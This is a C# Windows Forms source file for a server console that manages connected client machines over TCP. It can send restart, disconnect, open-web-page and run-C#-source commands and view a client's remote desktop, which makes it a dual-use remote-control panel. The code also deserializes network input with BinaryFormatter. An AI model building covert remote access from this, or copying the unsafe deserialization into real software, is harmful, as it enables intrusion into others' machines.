using CommanderServer.Commands;
using CommanderServer.Config;
using CommanderServer.UI;
using CSharpExtendedCommands.Web.Communication;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Row = System.Windows.Forms.DataGridViewRow;
using Timer = System.Timers.Timer;
namespace CommanderServer
{
    public partial class Server : Form
    {
        public static Server inst;
        public static object GetClient<T>(ClientInfo info) where T : class
        {
            foreach (var kv in inst.clients)
                if (kv.Key.ClientPCName == info.ClientPCName && kv.Key.ClientPort == info.ClientPort && kv.Key.ClientIp == info.ClientIp)
                    if (typeof(T) == typeof(TCPClient))
                        return new TCPClient(kv.Value, true);
                    else if (typeof(T) == typeof(TcpClient))
                        return new TcpClient() { Client = kv.Value };
            return null;
        }
        public Server()
        {
            InitializeComponent();
            inst = this;
            CheckForIllegalCrossThreadCalls = false;
            server = new TCPServer(54782);
            server.AutoRelistenForMessages = false;
            server.BeginReceiveOnConnection = false;
            server.ClientConnected += Server_ClientConnected;
            server.ClientDisconnected += Server_ClientDisconnected;
            CommanderMainServer.clientsView = gunaDataGridView1;
            if (!File.Exists(Settings.File))
            { Settings.LoadDefault(); Settings.SaveJSON(Settings.File); }
            else
                Settings.LoadJSON(Settings.File);
            Text = Settings.MainWindowTitle;
            gunaDataGridView1.MouseClick += delegate (object sender, MouseEventArgs e)
            {
                if (e.Button == MouseButtons.Right && gunaDataGridView1.SelectedRows.Count != 0)
                    gunaContextMenuStrip1.Show(MousePosition);
            };
        }
        void RestartClient(ClientInfo cl)
        {
            var client = (TCPClient)GetClient<TCPClient>(cl);
            try { client.SendPackage("COMMAND_RESTART"); } catch { }
        }
        void DisconnectClient(ClientInfo cl)
        {
            var client = (TCPClient)GetClient<TCPClient>(cl);
            try { client.SendPackage("COMMAND_DISCONNECT"); } catch { }
        }
        private void ExecuteCommand(object sender, params object[] parameters)
        {
            var m = ((ToolStripItem)sender).Text.Replace("#", "").Replace(" ", "_");
            Row row = gunaDataGridView1.SelectedRows[0];
            var ip = row.Cells[0].Value as string;
            var port = ushort.Parse(row.Cells[1].Value as string);
            var name = row.Cells[2].Value as string;
            if (m == "Disconnect")
            {

                DisconnectClient(new ClientInfo(ip, port, name));
                return;
            }
            else if (m == "Restart")
            {
                RestartClient(new ClientInfo(ip, port, name));
                return;
            }
            var method = typeof(Commands.Commands).GetMethod(m);
            if (method != null)
            {
                Commands.Commands.Parameters = parameters;
                method.Invoke(null, new object[] { new ClientInfo(ip, port, name) });
            }
            else
                MessageBox.Show("Command not avaliable yet!", "Send Command", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        Dictionary<ClientInfo, Socket> clients = new Dictionary<ClientInfo, Socket>();
        Dictionary<Socket, ClientInfo> infos = new Dictionary<Socket, ClientInfo>();

        private void Server_ClientDisconnected(object sender, TCPServer.ClientConnectionArgs e)
        {
            RemoveClient(e.Client);
        }

        private void Server_ClientConnected(object sender, TCPServer.ClientConnectionArgs e)
        {
            AddClient(e.Client);
            new Thread(new ParameterizedThreadStart(ClientListen)).Start(e.Client);
        }
        void RemoveClient(Socket client)
        {
            var info = infos[client];
            infos.Remove(client);
            clients.Remove(info);
            new TCPClient(client, true).RemoveClientView();
        }
        void AddClient(Socket client)
        {
            var info = new TCPClient(client, true).AddClientView();
            clients.Add(info, client);
            infos.Add(client, info);
        }
        BinaryFormatter formatter;
        void ClientListen(object param)
        {
            if (param.GetType() != typeof(Socket))
                return;
            if (formatter == null)
                formatter = new BinaryFormatter();
            while (((Socket)param).Connected)
            {
                var client = new TCPClient((Socket)param, true);
                object ret = null;
                try { ret = client.ReceiveFromStream(); } catch { }
                if (ret == null)
                    goto jmp;
                if (ret is Image)
                {
                    if (desktop != null)
                        if (desktop.ClientSocket == (Socket)param)
                            desktop.RemoteDesktopObject.SetDesktopImage((Image)ret);
                }
                else if (ret == "CLIENT DISCONNECTED")
                {
                    server.DisconnectClient((Socket)param, "Disconnect Request");
                    break;
                }
            jmp:;
            }
        }
        object ClientHandleRequest(Socket client)
        {
            try
            {
                var c = new TCPClient(client, true);
                return c.ReceiveFromStream();
            }
            catch { RemoveClient(client); return "CLIENT DISCONNECTED"; }
        }
        TCPServer server;
        TcpListener listener;
        public void StartServer()
        {
            var t = new Timer(Settings.EnableDisableDelay) { AutoReset = true };
            t.Elapsed += delegate (object sender, ElapsedEventArgs e)
            {
                if (gunaGauge1.Value != 100)
                    gunaGauge1.Value++;
                else
                {
                    t.AutoReset = false;
                    server.Start();
                    UpdateServerStatus();
                }
            };
            t.Start();
        }
        public void StopServer()
        {
            var t = new Timer(Settings.EnableDisableDelay) { AutoReset = true };
            t.Elapsed += delegate (object sender, ElapsedEventArgs e)
            {
                if (gunaGauge1.Value != 0)
                    gunaGauge1.Value--;
                else
                {
                    t.AutoReset = false;
                    UpdateServerStatus();
                }
            };
            t.Start();
            listener.Stop();
            server.Shutdown();
            //server.Running = false;
        }
        void UpdateServerStatus()
        {
            Application.DoEvents();
            gunaGradientButton1.Text = server.Running ? "Stop Server" : "Start Server";
            gunaGradientButton1.Enabled = true;
            gunaLabel2.ForeColor = server.Running ? Color.LimeGreen : Color.Red;
            gunaLabel2.Text = server.Running ? "Running" : "Stopped";
        }
        private void gunaGradientButton1_Click(object sender, EventArgs e)
        {
            gunaGradientButton1.Enabled = false;
            var m = this.GetType().GetMethod(server.Running ? "StopServer" : "StartServer");
            new Thread(() => m.Invoke(this, null)).Start();
        }


        private void openWebPagToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var input = Interaction.InputBox("Page url", "Input page url", "https://");
            var nav = Interaction.InputBox("Navigator", "Input Navigator", "chrome.exe");
            if (!string.IsNullOrEmpty(input) && !string.IsNullOrEmpty(nav))
                ExecuteCommand(sender, input, nav);
        }
        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog() { Filter = "CSharp Source Files (*.cs)|*.cs" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                var reader = new StreamReader(ofd.FileName);
                var cnt = reader.ReadToEnd();
                reader.Close();
                ExecuteCommand(sender, cnt);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExecuteCommand(sender);
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExecuteCommand(sender);
        }

        Forms.RemoteDesktop desktop;
        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var client = (TcpClient)GetClient<TcpClient>(new ClientInfo(gunaDataGridView1.SelectedRows[0]));
            desktop = new Forms.RemoteDesktop();
            desktop.SetClient(client);
            desktop.Show();
        }
    }
}
